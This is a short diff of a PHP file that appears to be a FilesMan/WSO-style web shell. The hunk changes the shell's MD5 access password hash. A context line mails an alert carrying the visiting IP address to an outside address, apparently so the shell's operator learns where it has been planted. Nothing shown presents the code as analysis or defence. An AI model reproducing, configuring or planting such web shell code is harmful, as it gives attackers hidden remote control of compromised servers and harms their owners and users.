@@ -19,7 +19,7 @@ mail($destinationmail, "MD", $mail_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]")
 
 /* Configuration */
 /* Password using md5 hashes */
-$password = "12be9b20bba24b6c5fd80e1abda2e317"; //
+$password = "4403b4cf3c06f83e01a03ded33da7323"; //
 $default_action = "FilesMan";
 $default_use_ajax = true;
 $default_charset = 'UTF-8';
